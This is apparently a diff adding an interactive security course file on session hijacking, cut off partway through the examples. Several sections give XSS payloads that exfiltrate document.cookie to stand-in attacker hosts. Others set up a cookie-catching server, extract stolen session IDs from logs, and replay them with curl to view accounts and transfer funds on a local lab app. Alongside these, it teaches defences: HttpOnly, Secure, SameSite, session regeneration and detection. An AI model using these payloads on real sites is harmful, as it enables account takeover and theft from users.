@@ -1,0 +1,1576 @@
+{
+  "course_id": "session_hijacking_hands_on",
+  "title": "Session Hijacking — Hands-On",
+  "description": "Steal, replay, and defend session cookies: python3 http.server capture, curl replay, cookie flags, and real session hijacking attacks",
+  "difficulty": "ADVANCED",
+  "estimated_hours": 8,
+  "prerequisites": [
+    "xss_web_security"
+  ],
+  "learning_outcomes": [
+    "Understand how HTTP sessions work and why they are vulnerable",
+    "Set up a cookie-capturing server with python3 -m http.server",
+    "Steal session cookies via XSS and exfiltrate them to a remote server",
+    "Replay stolen cookies with curl to impersonate victims",
+    "Detect session hijacking through log analysis",
+    "Implement HttpOnly, Secure, and SameSite cookie defences"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins.",
+    "intervention_triggers": {
+      "idle_40_seconds": "Sessions can be confusing — think of them as hotel key cards. Want me to explain with that analogy?",
+      "idle_90_seconds": "Still thinking? Let me break this into smaller steps. Which part is tricky: the cookie, the capture, or the replay?",
+      "idle_180_seconds": "No rush! Let me show you a diagram of exactly how the cookie travels from victim to attacker.",
+      "first_error": "Close! Check your cookie string — it needs to be copied exactly, including the node0 part at the end.",
+      "repeated_errors": "Let me trace through the attack step by step with you. First, where does the cookie come from?",
+      "after_success": "You just hijacked a session! That's a real penetration testing skill. Now let's learn to defend against it."
+    },
+    "encouragement_phrases": [
+      "You're thinking like a penetration tester now!",
+      "Session hijacking is one of the most powerful attacks — and you just did it!",
+      "Understanding the attack is the first step to building the defence.",
+      "Real security auditors use exactly these techniques.",
+      "You just proved why HttpOnly cookies matter — with evidence!",
+      "curl replay is used in real bug bounty reports.",
+      "Every cookie flag you learn saves thousands of users from attack.",
+      "You're building skills that companies pay top dollar for."
+    ],
+    "explanation_styles": {
+      "analogy": "A session cookie is like a hotel key card. If someone copies your card, they get into your room, use the minibar, and charge it all to you. The hotel can't tell the difference.",
+      "visual": "Browser → sends cookie → Server says 'Welcome user1' / Attacker → sends SAME cookie → Server says 'Welcome user1' (can't tell the difference!)",
+      "step_by_step": "Step 1: Start listener. Step 2: Inject XSS. Step 3: Victim visits page. Step 4: Cookie captured. Step 5: curl with cookie. Step 6: You ARE the victim.",
+      "code_trace": "Line 1: python3 -m http.server 8000 — starts listening. Line 2: new Image().src sends GET request. Line 3: Server log shows ?c=JSESSIONID=...",
+      "comparison": "Without HttpOnly: document.cookie returns 'JSESSIONID=abc123' → stealable. With HttpOnly: document.cookie returns '' → invisible to JavaScript."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "session_hijacking_lesson_1",
+      "title": "Session Hijacking — From Cookie Theft to Account Takeover",
+      "theory": {
+        "introduction": "Every time you log into a website, the server gives your browser a small piece of data called a session cookie. This cookie is your proof of identity — like a wristband at a festival. Show the wristband, get VIP access. No questions asked.\n\nBut what if someone photographs your wristband and prints a copy? They walk into VIP, drink your drinks, and charge everything to your account. The security guard can't tell the difference — the wristband looks identical.\n\nThat's exactly what session hijacking does. An attacker steals your session cookie (usually via XSS), then uses it to impersonate you. The server sees a valid cookie and thinks the attacker IS you.\n\nThis module teaches you the complete session hijacking chain: from setting up a cookie-capturing server, to stealing cookies via XSS, to replaying them with curl, to defending against the entire attack. Everything is hands-on — you'll do every step yourself.",
+        "why_important": "Session hijacking is one of the most impactful web attacks because it gives the attacker COMPLETE control of the victim's account — without needing their password. Banks, social media, email — any application that uses session cookies is vulnerable if the cookies aren't properly protected.\n\nThe defence is simple: three cookie flags (HttpOnly, Secure, SameSite). But a shocking number of real applications still get this wrong. Understanding the attack teaches you exactly WHY these flags matter and what happens when they're missing.",
+        "key_concepts": [
+          {
+            "concept": "How HTTP Sessions Work",
+            "explanation": "HTTP is stateless — the server forgets you after every request. Sessions solve this by giving your browser a unique ID (the session cookie) after you log in.\n\nThe flow:\n1. You send username + password to the server\n2. Server verifies credentials and creates a session (a data structure stored in server memory)\n3. Server sends back a cookie: Set-Cookie: JSESSIONID=node0abc123\n4. Your browser stores this cookie\n5. Every subsequent request includes: Cookie: JSESSIONID=node0abc123\n6. Server looks up this ID, finds your session data, and knows it's you\n\nThe critical point: the server identifies you ONLY by this cookie value. Anyone who sends the same cookie IS you, as far as the server knows.",
+            "example": "// HTTP Request WITHOUT session (not logged in):\n// GET /account HTTP/1.1\n// Host: bank.com\n// (no cookie)\n// → Server responds: 302 Redirect to /login\n\n// HTTP Request WITH session (logged in):\n// GET /account HTTP/1.1\n// Host: bank.com\n// Cookie: JSESSIONID=node0abc123xyz.node0\n// → Server responds: 200 OK (shows your account!)\n\n// The ONLY difference is the Cookie header.\n// If an attacker sends the same Cookie header,\n// they see YOUR account.",
+            "ai_hint": "Think of JSESSIONID as a numbered ticket at a deli counter. If someone has ticket #42, they get served as customer #42 — regardless of who they actually are."
+          },
+          {
+            "concept": "Cookie Flags — The Three Guards",
+            "explanation": "Session cookies have three security flags. Each one blocks a different attack vector:\n\nHttpOnly — Blocks JavaScript access\n• When set: document.cookie CANNOT read the session cookie\n• When missing: XSS can steal the cookie via document.cookie\n• This is the #1 defence against cookie theft via XSS\n\nSecure — Blocks unencrypted transmission\n• When set: Cookie only sent over HTTPS\n• When missing: Cookie sent over plain HTTP too (network sniffing possible)\n• Anyone on the same WiFi can intercept the cookie\n\nSameSite — Blocks cross-site sending\n• Strict: Cookie never sent with cross-site requests\n• Lax: Cookie sent with GET navigations but not POST\n• None: Cookie always sent (no protection)\n• Prevents CSRF attacks that rely on automatic cookie inclusion",
+            "example": "// CHECK COOKIE FLAGS IN BROWSER:\n// F12 → Storage tab (Firefox) or Application tab (Chrome)\n// → Cookies → http://localhost:15000\n//\n// Look for JSESSIONID row:\n// ┌──────────┬─────────┬───────────────────┐\n// │ Flag     │ Value   │ What it means     │\n// ├──────────┼─────────┼───────────────────┤\n// │ HttpOnly │ false ✗ │ JS can steal it!  │\n// │ Secure   │ false ✗ │ Sent over HTTP!   │\n// │ SameSite │ (empty) │ No CSRF protect!  │\n// └──────────┴─────────┴───────────────────┘\n// ALL THREE missing = maximum vulnerability\n\n// JAVA CODE TO SET FLAGS:\nCookie c = new Cookie(\"JSESSIONID\", sessionId);\nc.setHttpOnly(true);   // JS blocked\nc.setSecure(true);     // HTTPS only\nc.setMaxAge(1800);     // 30min timeout\nresponse.addCookie(c);",
+            "ai_hint": "HttpOnly = invisible ink (JS can't see it). Secure = armoured truck (only travels on safe roads). SameSite = ID check (only accepted from the same website)."
+          },
+          {
+            "concept": "Setting Up a Cookie Catcher — python3 http.server",
+            "explanation": "Before you can steal a cookie, you need somewhere to receive it. The simplest way is Python's built-in HTTP server. It logs every request including the full URL — which is where the stolen cookie will be embedded.\n\nSetup:\n1. Open a terminal\n2. Run: python3 -m http.server 8000\n3. The server starts listening on port 8000\n4. Every incoming request is logged with the full URL\n\nWhen an XSS payload sends: new Image().src = 'http://YOUR_IP:8000/?c=' + document.cookie\nThe server log shows: GET /?c=JSESSIONID=node0abc123 HTTP/1.1 200\n\nYou now have the victim's session cookie.",
+            "example": "// STEP 1: Start the listener\n// Terminal:\n// python3 -m http.server 8000\n// Output: Serving HTTP on 0.0.0.0 port 8000 ...\n\n// STEP 2: Test it works\n// In another terminal or browser:\n// curl http://localhost:8000/?test=hello\n// Server log shows:\n// 127.0.0.1 - [date] \"GET /?test=hello HTTP/1.1\" 200 -\n\n// STEP 3: Now the XSS payload will send cookies here:\n// <script>\n// new Image().src = 'http://ATTACKER:8000/?c=' + document.cookie;\n// </script>\n// Server log shows:\n// 127.0.0.1 - [date] \"GET /?c=JSESSIONID=node0abc HTTP/1.1\" 200 -\n//                              ^^^^^^^^^^^^^^^^^\n//                              STOLEN COOKIE!",
+            "ai_hint": "python3 http.server is like setting up a mailbox. You put up the mailbox (start the server), and wait for letters (cookies) to arrive. Every letter gets logged."
+          },
+          {
+            "concept": "XSS Cookie Exfiltration Techniques",
+            "explanation": "There are several ways to send a stolen cookie from the victim's browser to the attacker's server. Each has trade-offs:\n\n1. Image tag: new Image().src = 'http://evil/?c=' + document.cookie\n   Pro: Works everywhere, bypasses most CSP\n   Con: Shows in Network tab if someone looks\n\n2. Fetch API: fetch('http://evil/?c=' + document.cookie)\n   Pro: Modern, clean code\n   Con: Blocked by strict CSP, CORS issues\n\n3. Navigator.sendBeacon: navigator.sendBeacon('http://evil/', document.cookie)\n   Pro: Designed for analytics, often allowed\n   Con: POST only, some CSPs block it\n\n4. WebSocket: var ws = new WebSocket('ws://evil/'); ws.send(document.cookie)\n   Pro: Real-time, bidirectional\n   Con: More complex, WebSocket must be set up\n\nThe Image technique is the most reliable and widely used.",
+            "example": "// METHOD 1 — Image (most reliable):\n<script>\nvar img = new Image();\nimg.src = 'http://attacker:8000/?c=' + document.cookie;\n</script>\n// Browser tries to load an 'image' from attacker's server\n// The cookie is in the URL query string\n// Works even with basic CSP because images are usually allowed\n\n// METHOD 2 — Hidden iframe + redirect:\n<script>\nvar iframe = document.createElement('iframe');\niframe.style.display = 'none';\niframe.src = 'http://attacker:8000/?c=' + document.cookie;\ndocument.body.appendChild(iframe);\n</script>\n\n// METHOD 3 — Encoded to avoid detection:\n<script>\nvar c = btoa(document.cookie);  // Base64 encode\nnew Image().src = 'http://attacker:8000/?d=' + c;\n</script>\n// Attacker decodes: echo 'encoded_string' | base64 -d",
+            "ai_hint": "The Image trick is the Swiss Army knife of cookie theft — simple, reliable, and works almost everywhere. The browser doesn't care that the 'image' never loads — the request was already sent."
+          },
+          {
+            "concept": "Reading Server Logs — Extracting the Cookie",
+            "explanation": "After the XSS fires and sends the cookie, you need to extract it from the server logs. Here's what to look for:\n\nServer log format:\nIP - [date] \"METHOD /path?params HTTP/1.1\" status_code -\n\nExample:\n127.0.0.1 - [06/Mar/2026 18:19:48] \"GET /?c=JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0 HTTP/1.1\" 200 -\n\nThe cookie value is everything after ?c= and before HTTP:\nJSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0\n\nImportant: If you see multiple different JSESSIONID values in the log, each one belongs to a different user session. This means you've captured cookies from multiple victims.",
+            "example": "// Server log with multiple captured sessions:\n//\n// 127.0.0.1 - [06/Mar 18:19] GET /?c=JSESSIONID=node016d4q... 200\n// 127.0.0.1 - [06/Mar 19:26] GET /?c=JSESSIONID=node016d4q... 200\n// 127.0.0.1 - [06/Mar 19:27] GET /?c=JSESSIONID=node016d4q... 200\n// 127.0.0.1 - [06/Mar 19:28] GET /?c=JSESSIONID=node01ph03... 200\n//                                                ^^^^^^^^^\n//                                   DIFFERENT session = DIFFERENT user!\n\n// Analysis:\n// Lines 1-3: Same JSESSIONID (node016d4q) — same user, 3 visits\n// Line 4: Different JSESSIONID (node01ph03) — NEW victim!\n\n// Extract just the cookie values:\n// grep -o 'JSESSIONID=[^ ]*' server.log | sort -u\n// JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0\n// JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0",
+            "ai_hint": "Each unique JSESSIONID is a different person's session. It's like catching different people's hotel key cards — each card opens a different room."
+          },
+          {
+            "concept": "curl Replay — Becoming the Victim",
+            "explanation": "curl is a command-line tool for making HTTP requests. By including the stolen cookie with the --cookie flag, you can make requests as if you were the victim.\n\nBasic replay (view account):\ncurl http://bank.com/account --cookie 'JSESSIONID=stolen_value'\n\nThe server receives this request, looks up the session ID, finds it belongs to user1, and returns user1's account page — complete with balance, card number, and profile.\n\nAction replay (transfer funds):\ncurl -X POST http://bank.com/transfer \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  -d 'to=999999&transferAmount=500' \\\n  --cookie 'JSESSIONID=stolen_value'\n\nThe server processes this as a legitimate transfer FROM user1. The victim's balance decreases. The attacker never needed the password.",
+            "example": "// STEP 1: View victim's account\n// curl http://localhost:15000/account \\\n//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'\n// Response: HTML showing victim's balance, card number, profile\n\n// STEP 2: Transfer funds as the victim\n// curl -X POST http://localhost:15000/transfer \\\n//   -H 'Content-Type: application/x-www-form-urlencoded' \\\n//   -d 'to=999999&transferAmount=500' \\\n//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'\n// Response: 302 redirect (transfer successful)\n\n// STEP 3: Verify the theft\n// curl http://localhost:15000/account \\\n//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'\n// Response: Balance has DECREASED by 500$!\n\n// The victim's balance dropped and they have NO idea.\n// No password was needed. No login alert was triggered.\n// Just a cookie.",
+            "ai_hint": "curl with --cookie is like wearing someone else's name badge at a conference. Everyone treats you as that person. You can go to their meetings, access their documents, and speak on their behalf."
+          },
+          {
+            "concept": "Session Fixation vs Session Hijacking",
+            "explanation": "These are two different session attacks:\n\nSession HIJACKING (what we've been learning):\n• When: AFTER the victim logs in\n• How: Steal the existing session cookie\n• The victim already has a valid session\n• Attacker steals it and uses it\n\nSession FIXATION:\n• When: BEFORE the victim logs in\n• How: Attacker sets the session ID, then waits for victim to log in\n• Attacker creates a session ID, tricks victim into using it\n• After victim logs in, that fixed session ID is now authenticated\n• Attacker already knows the ID — instant access\n\nDefence against fixation: Regenerate the session ID on login.\nThe old (fixed) ID becomes invalid, and the attacker's known ID is useless.",
+            "example": "// SESSION FIXATION ATTACK:\n\n// Step 1: Attacker visits bank.com, gets session ID 'AAA'\n// Step 2: Attacker sends victim a link:\n//   http://bank.com/login?JSESSIONID=AAA\n// Step 3: Victim clicks link, logs in\n//   Victim is now authenticated with session ID 'AAA'\n// Step 4: Attacker uses session ID 'AAA' (they already know it!)\n//   Attacker is now logged in as the victim!\n\n// DEFENCE — Regenerate on login:\nprotected void doPost(HttpServletRequest req, ...) {\n    // Verify username + password...\n    if (authenticated) {\n        req.getSession().invalidate();  // Kill old session\n        HttpSession newSession = req.getSession(true);  // New ID!\n        newSession.setAttribute(\"user\", username);\n    }\n}\n// Old session ID 'AAA' is now DEAD.\n// Attacker's known ID is useless.",
+            "ai_hint": "Hijacking = stealing someone's car keys after they parked. Fixation = giving someone a car with a spare key you kept. Both end with you driving their car."
+          },
+          {
+            "concept": "Session Timeout and Invalidation",
+            "explanation": "Even if a cookie is stolen, the damage is limited if the session expires quickly. Good session management includes:\n\nAbsolute timeout: Session dies after X minutes regardless of activity (e.g., 30 minutes for banking). This limits the window an attacker has to use a stolen cookie.\n\nIdle timeout: Session dies after X minutes of no requests (e.g., 5 minutes). If the victim stops using the site, the stolen cookie becomes useless.\n\nExplicit invalidation: When the user clicks 'Logout', the session is destroyed server-side. The cookie value still exists in the browser, but the server no longer recognises it.\n\nSession regeneration: Create a new session ID after sensitive actions (login, password change, privilege escalation). This invalidates any previously stolen cookies.",
+            "example": "// SET SESSION TIMEOUT (Java):\n// In web.xml:\n// <session-config>\n//   <session-timeout>30</session-timeout>  <!-- 30 minutes -->\n// </session-config>\n\n// PROGRAMMATIC TIMEOUT:\nHttpSession session = request.getSession();\nsession.setMaxInactiveInterval(1800);  // 30 min in seconds\n\n// EXPLICIT LOGOUT:\nprotected void doGet(HttpServletRequest req, ...) {\n    HttpSession session = req.getSession(false);\n    if (session != null) {\n        session.invalidate();  // Destroy session server-side\n    }\n    // Expire the cookie client-side:\n    Cookie c = new Cookie(\"JSESSIONID\", \"\");\n    c.setMaxAge(0);  // Immediate expiry\n    c.setPath(\"/\");\n    response.addCookie(c);\n    response.sendRedirect(\"/login\");\n}\n// After logout, the stolen cookie returns: 'session not found'",
+            "ai_hint": "Session timeout is like an expiring train ticket. Even if someone steals your ticket, it only works until the expiry time. Shorter timeout = smaller risk window."
+          },
+          {
+            "concept": "Network-Level Session Theft (WiFi Sniffing)",
+            "explanation": "If the Secure flag is missing, the session cookie is sent over plain HTTP — unencrypted. Anyone on the same network can intercept it.\n\nHow it works:\n1. Victim connects to public WiFi (coffee shop, airport)\n2. Victim visits http://bank.com (not HTTPS)\n3. Browser sends: Cookie: JSESSIONID=abc123 IN PLAIN TEXT\n4. Attacker on the same WiFi captures the packet\n5. Attacker now has the session cookie\n\nThis is called a 'man-in-the-middle' attack. Tools like Wireshark can capture these cookies in seconds.\n\nDefence: The Secure flag ensures the cookie is ONLY sent over HTTPS. Even on public WiFi, HTTPS encrypts the cookie so it cannot be read by others on the network.",
+            "example": "// WITHOUT SECURE FLAG:\n// HTTP request (unencrypted):\n// GET /account HTTP/1.1\n// Host: bank.com\n// Cookie: JSESSIONID=abc123  ← VISIBLE TO EVERYONE ON WIFI!\n\n// WITH SECURE FLAG:\n// The browser REFUSES to send the cookie over HTTP.\n// Only sends it over HTTPS (encrypted).\n// Even if someone captures the packet, they see:\n// 17 03 03 00 1a 8f 2e ... (encrypted bytes)\n// The cookie value is HIDDEN inside the encryption.\n\n// JAVA CODE:\nCookie c = new Cookie(\"JSESSIONID\", sessionId);\nc.setSecure(true);  // HTTPS only!\nresponse.addCookie(c);\n\n// If the site also has HSTS header:\n// Strict-Transport-Security: max-age=31536000\n// The browser automatically upgrades HTTP → HTTPS\n// So the cookie is NEVER sent unencrypted.",
+            "ai_hint": "Plain HTTP is like sending a postcard — anyone who handles it can read it. HTTPS is like a sealed envelope — only the recipient can open it. The Secure flag ensures your cookie always travels in an envelope."
+          },
+          {
+            "concept": "Detecting Session Hijacking",
+            "explanation": "How do you know if someone is using a stolen session? Look for these red flags:\n\n1. IP address change: Same session used from two different IPs\n2. User-Agent change: Session switches from Chrome to curl\n3. Geographic impossibility: Session in London, then New York 1 minute later\n4. Activity patterns: Actions at 3 AM for a user who only uses the app 9-5\n5. Concurrent sessions: Same session active in two browsers simultaneously\n\nServer-side detection:\n- Log the IP and User-Agent with each request\n- Compare with previous requests in the same session\n- If they change dramatically, invalidate the session and force re-login\n- Alert the user: 'Your account was accessed from an unusual location'",
+            "example": "// DETECTION CODE (Java filter):\npublic class SessionSecurityFilter implements Filter {\n    public void doFilter(ServletRequest req, ...) {\n        HttpServletRequest httpReq = (HttpServletRequest) req;\n        HttpSession session = httpReq.getSession(false);\n        if (session != null) {\n            String currentIP = httpReq.getRemoteAddr();\n            String savedIP = (String) session.getAttribute(\"client_ip\");\n            \n            if (savedIP != null && !savedIP.equals(currentIP)) {\n                // IP CHANGED! Possible hijacking!\n                session.invalidate();\n                ((HttpServletResponse)resp).sendRedirect(\"/login?reason=security\");\n                return;\n            }\n            session.setAttribute(\"client_ip\", currentIP);\n        }\n        chain.doFilter(req, resp);\n    }\n}\n// This catches curl replays from different IPs!",
+            "ai_hint": "It's like a bank that notices your card was used in London and Tokyo within 5 minutes. That's physically impossible — the card must be cloned. Same logic applies to session cookies."
+          },
+          {
+            "concept": "Complete Session Security Checklist",
+            "explanation": "A properly secured session needs ALL of these:\n\n1. Cookie flags: HttpOnly=true, Secure=true, SameSite=Strict\n2. Session timeout: 30 minutes max for sensitive apps\n3. Session regeneration: New ID on login, password change, privilege escalation\n4. Logout: Server-side invalidation + cookie expiry\n5. Transport: HTTPS everywhere + HSTS header\n6. Detection: Monitor for IP/User-Agent changes\n7. Binding: Optional — bind session to IP or browser fingerprint\n8. Token rotation: Rotate session ID periodically (every 15 minutes)\n\nIf ANY of these is missing, there's a potential attack vector. Defence in depth means implementing ALL of them.",
+            "example": "// COMPLETE SECURE SESSION SETUP:\n\n// 1. Cookie flags (at session creation):\nCookie c = new Cookie(\"JSESSIONID\", id);\nc.setHttpOnly(true);\nc.setSecure(true);\nc.setMaxAge(1800);\nc.setPath(\"/\");\nresp.setHeader(\"Set-Cookie\", c.getName() + \"=\" + c.getValue()\n    + \"; HttpOnly; Secure; SameSite=Strict; Path=/\");\n\n// 2. Regenerate on login:\nsession.invalidate();\nHttpSession newSession = req.getSession(true);\n\n// 3. HSTS header:\nresp.setHeader(\"Strict-Transport-Security\",\n    \"max-age=31536000; includeSubDomains\");\n\n// 4. Logout handler:\nsession.invalidate();\nCookie expired = new Cookie(\"JSESSIONID\", \"\");\nexpired.setMaxAge(0);\nresp.addCookie(expired);\n\n// With ALL of these:\n// - XSS can't read cookie (HttpOnly)\n// - Network can't intercept (Secure + HSTS)\n// - Cross-site can't use it (SameSite)\n// - Stolen cookies expire fast (MaxAge)\n// - Old cookies die on logout (invalidate)",
+            "ai_hint": "Think of it as a castle: HttpOnly is the moat, Secure is the walls, SameSite is the guards, timeout is the drawbridge that rises at night. You need ALL of them."
+          },
+          {
+            "concept": "Real-World Session Attacks — Case Studies",
+            "explanation": "Session hijacking isn't theoretical — it happens to major companies:\n\nFiresheep (2010): A Firefox extension that captured session cookies on public WiFi. It could hijack Facebook, Twitter, and Amazon sessions with one click. It was used by millions before HTTPS became standard.\n\nGitHub (2013): A session fixation vulnerability allowed attackers to fix a session ID via a crafted URL. After the victim logged in, the attacker had full access to their repositories.\n\nSlack (2022): Session token theft via compromised employee credentials allowed attackers to access private Slack channels and download private repository data.\n\nAll of these could have been prevented with proper cookie flags and session management. The defences you're learning in this module would have stopped every single one.",
+            "example": "// FIRESHEEP ATTACK (2010):\n// 1. Attacker installs Firesheep in Firefox\n// 2. Connects to coffee shop WiFi\n// 3. Firesheep captures all HTTP cookies on the network\n// 4. Shows a list of all logged-in users on the sidebar\n// 5. Attacker clicks a user → instant access to their Facebook!\n\n// WHY IT WORKED:\n// - Facebook used HTTPS for login but HTTP for browsing\n// - Session cookie sent over unencrypted HTTP\n// - Anyone on the WiFi could read it\n\n// THE FIX:\n// Facebook (and most sites) switched to HTTPS everywhere\n// + Secure flag on cookies\n// + HSTS headers\n// Firesheep became useless overnight.\n\n// LESSON:\n// One missing flag (Secure) enabled millions of account hijacks.\n// The fix was simple. The damage before the fix was enormous.",
+            "ai_hint": "Firesheep was a wake-up call for the entire internet. It showed that session cookies on public WiFi were like shouting your password across a crowded room. HTTPS everywhere was the response."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: Check Cookie Flags in Browser",
+          "description": "Use Developer Tools to inspect session cookie security flags.",
+          "difficulty": "beginner",
+          "code": "// STEPS:\n// 1. Open any web app in your browser\n// 2. Press F12 to open Developer Tools\n// 3. Firefox: Storage tab → Cookies\n//    Chrome: Application tab → Cookies\n// 4. Find JSESSIONID (or session_id, PHPSESSID)\n// 5. Check these columns:\n//    - HttpOnly: true or false?\n//    - Secure: true or false?\n//    - SameSite: Strict, Lax, or empty?\n\n// WHAT YOU SHOULD SEE IN A VULNERABLE APP:\n// Name: JSESSIONID\n// Value: node0abc123xyz.node0\n// HttpOnly: false   ← VULNERABLE!\n// Secure: false     ← VULNERABLE!\n// SameSite: (empty) ← VULNERABLE!",
+          "output": "Cookie flags displayed — HttpOnly=false means JavaScript can steal it, Secure=false means WiFi sniffing possible",
+          "ai_explanation": "This is the very first step of any session security assessment. Before trying any attack, check if the cookie is even stealable. If HttpOnly=true, the XSS→cookie chain is already broken.",
+          "ai_challenge": "What happens if HttpOnly is true but Secure is false? Is the session still vulnerable? (Hint: think about network sniffing)"
+        },
+        {
+          "title": "Example 2: Start a Cookie Catcher",
+          "description": "Set up a simple HTTP server to receive stolen cookies.",
+          "difficulty": "beginner",
+          "code": "// STEP 1: Open a terminal and run:\n// python3 -m http.server 8000\n// Output: Serving HTTP on 0.0.0.0 port 8000 ...\n\n// STEP 2: Test it with curl from another terminal:\n// curl http://localhost:8000/?test=it_works\n\n// STEP 3: Check the first terminal — you should see:\n// 127.0.0.1 - [date] \"GET /?test=it_works HTTP/1.1\" 200 -\n\n// The server logs EVERY request including the full URL.\n// When an XSS sends a cookie, it appears in this log.\n\n// IMPORTANT: Keep this terminal OPEN.\n// The server stops when you close it or press Ctrl+C.",
+          "output": "Server running on port 8000, logs all incoming requests including URL parameters",
+          "ai_explanation": "python3 http.server is the simplest way to receive data exfiltrated via XSS. No setup, no configuration, no third-party tools. Just one command.",
+          "ai_challenge": "What if port 8000 is already in use? How would you start the server on a different port?"
+        },
+        {
+          "title": "Example 3: Basic Cookie Theft XSS",
+          "description": "Inject a script that sends the session cookie to your server.",
+          "difficulty": "beginner",
+          "code": "// PAYLOAD (enter in a profile description field):\n// <script>\n// var img = new Image();\n// img.src = 'http://YOUR_IP:8000/?c=' + document.cookie;\n// </script>\n\n// WHAT HAPPENS:\n// 1. Script creates an invisible Image object\n// 2. Sets its source to your server URL + the cookie\n// 3. Browser sends GET request to load the 'image'\n// 4. Your server logs: GET /?c=JSESSIONID=node0abc123\n\n// WHY Image() WORKS:\n// - No Same-Origin restriction on image loads\n// - No visible change on the page\n// - No click needed from the victim\n// - Works in virtually every browser",
+          "output": "Server log shows: GET /?c=JSESSIONID=node0abc123xyz.node0 HTTP/1.1 200",
+          "ai_explanation": "The Image trick exploits the fact that browsers load images from any domain without restriction. The 'image' URL contains the stolen cookie as a query parameter.",
+          "ai_challenge": "What if the victim's browser has an ad blocker that blocks requests to unknown IPs? How could you modify the exfiltration method?"
+        },
+        {
+          "title": "Example 4: Extract Cookie from Server Log",
+          "description": "Parse the server log to find the stolen JSESSIONID value.",
+          "difficulty": "intermediate",
+          "code": "// Your server log shows:\n// 127.0.0.1 - [06/Mar/2026 18:19:48] \"GET /?c=JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0 HTTP/1.1\" 200 -\n\n// TO EXTRACT THE COOKIE:\n// The cookie is between '?c=' and ' HTTP'\n// Value: JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0\n\n// COMMAND TO EXTRACT:\n// grep -o 'JSESSIONID=[^ ]*' server.log\n// Output: JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0\n\n// FOR MULTIPLE UNIQUE SESSIONS:\n// grep -o 'JSESSIONID=[^ ]*' server.log | sort -u",
+          "output": "Extracted: JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0",
+          "ai_explanation": "The cookie value includes everything from JSESSIONID= to the next space. The .node0 suffix is part of the value — don't forget to include it when replaying.",
+          "ai_challenge": "If you see 5 log entries but only 2 unique JSESSIONID values, what does that tell you?"
+        },
+        {
+          "title": "Example 5: Replay with curl — View Account",
+          "description": "Use the stolen cookie to access the victim's account page.",
+          "difficulty": "intermediate",
+          "code": "// COMMAND:\n// curl http://localhost:15000/account \\\n//   --cookie 'JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0'\n\n// EXPECTED OUTPUT:\n// HTML containing the victim's:\n// - Username (e.g., 'Welcome, user1')\n// - Balance (e.g., '6701 $')\n// - Card number (e.g., '111111')\n// - Profile description\n\n// PROOF OF HIJACKING:\n// You're seeing user1's data without knowing their password.\n// The server accepted the stolen cookie as valid authentication.",
+          "output": "curl returns victim's account page with balance, card number, and profile — session hijacking confirmed",
+          "ai_explanation": "This is the proof-of-concept that the session was successfully hijacked. The server cannot distinguish between the real user's browser and an attacker using curl with the same cookie.",
+          "ai_challenge": "How could the server detect that this request came from curl instead of a real browser? (Hint: check the User-Agent header)"
+        },
+        {
+          "title": "Example 6: Replay with curl — Transfer Funds",
+          "description": "Use the stolen session to transfer money as the victim.",
+          "difficulty": "intermediate",
+          "code": "// COMMAND:\n// curl -X POST http://localhost:15000/transfer \\\n//   -H 'Content-Type: application/x-www-form-urlencoded' \\\n//   -d 'to=999999&transferAmount=500' \\\n//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'\n\n// WHAT THIS DOES:\n// -X POST: sends a POST request (like submitting a form)\n// -H: sets the Content-Type header\n// -d: the form data (to=card_number, transferAmount=amount)\n// --cookie: includes the stolen session cookie\n\n// RESULT:\n// The server processes this as a legitimate transfer\n// from the victim's account to card 999999.\n// Victim's balance decreases by 500$.",
+          "output": "Transfer processed successfully — victim's balance decreased without their knowledge or password",
+          "ai_explanation": "This demonstrates the full impact of session hijacking: not just viewing data, but performing actions. The server sees a valid session cookie and a valid transfer request — it has no reason to reject it.",
+          "ai_challenge": "What if the transfer form required a CSRF token? Would curl replay still work? Why or why not?"
+        },
+        {
+          "title": "Example 7: Detect Multiple Victims",
+          "description": "Analyse server logs to identify cookies from different users.",
+          "difficulty": "intermediate",
+          "code": "// SERVER LOG:\n// 127.0.0.1 - [06/Mar 18:19] GET /?c=JSESSIONID=node016d4q... 200\n// 127.0.0.1 - [06/Mar 19:26] GET /?c=JSESSIONID=node016d4q... 200\n// 127.0.0.1 - [06/Mar 19:27] GET /?c=JSESSIONID=node016d4q... 200\n// 127.0.0.1 - [06/Mar 19:28] GET /?c=JSESSIONID=node01ph03... 200\n// 127.0.0.1 - [06/Mar 19:38] GET /?c=JSESSIONID=node01ph03... 200\n\n// ANALYSIS:\n// Session A: node016d4q (3 captures) = User 1\n// Session B: node01ph03 (2 captures) = User 2\n// Two different victims' cookies captured!\n\n// VERIFY:\n// curl /account --cookie A → shows user1 details\n// curl /account --cookie B → shows different user details",
+          "output": "Two distinct JSESSIONID values identified — each belongs to a different user, confirmed by accessing different account data",
+          "ai_explanation": "In a real attack with a stored XSS on a popular page, you'd see hundreds of different session cookies. Each one is a different victim. The attacker can impersonate any of them.",
+          "ai_challenge": "If you see the SAME JSESSIONID appearing 10 times, does that mean 10 different users? Why or why not?"
+        },
+        {
+          "title": "Example 8: Session Fixation Attack",
+          "description": "Set a session ID before the victim logs in, then use it after.",
+          "difficulty": "advanced",
